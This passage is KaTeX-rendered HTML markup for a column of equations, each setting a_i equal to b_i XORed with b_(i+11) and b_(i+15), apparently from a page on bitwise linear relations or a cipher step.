style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-20.970000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-19.530000000000015em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-18.090000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-16.650000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-15.210000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-13.770000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-12.330000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-10.890000000000013em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-9.450000000000012em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-8.010000000000012em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-6.570000000000015em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.130000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord 